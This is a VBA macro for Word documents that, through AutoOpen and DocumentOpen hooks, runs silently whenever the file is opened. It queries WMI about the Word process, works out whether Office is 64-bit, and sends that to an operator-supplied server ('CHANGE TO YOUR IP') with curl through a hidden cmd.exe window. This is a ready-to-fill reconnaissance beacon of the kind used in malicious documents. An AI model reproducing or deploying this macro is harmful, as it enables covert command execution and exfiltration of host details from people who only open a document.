Option Explicit

Sub SendProcessInfo()
    Dim processName As String, serverUrl As String, wmiService As Object, processList As Object, processItem As Object
    Dim result As String, is64Bit As Boolean

    serverUrl = "http://CHANGE TO YOUR IP" ' Change this to your server endpoint
    processName = "winword.exe" ' Replace with your process name

    ' Create WMI query and get process list
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")

    ' Check if process is found and determine 64-bit status
    If processList.Count > 0 Then
        For Each processItem In processList
            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
            result = "Process: " & processName & ", 64-bit: " & CStr(is64Bit)
        Next
    Else
        result = "Process not found."
    End If

    ' Execute cURL command
    Shell "cmd.exe /c curl -X POST -d """ & result & """ " & serverUrl, vbHide
End Sub
Sub AutoOpen()
    SendProcessInfo
End Sub
Sub DocumentOpen()
    SendProcessInfo
End Sub
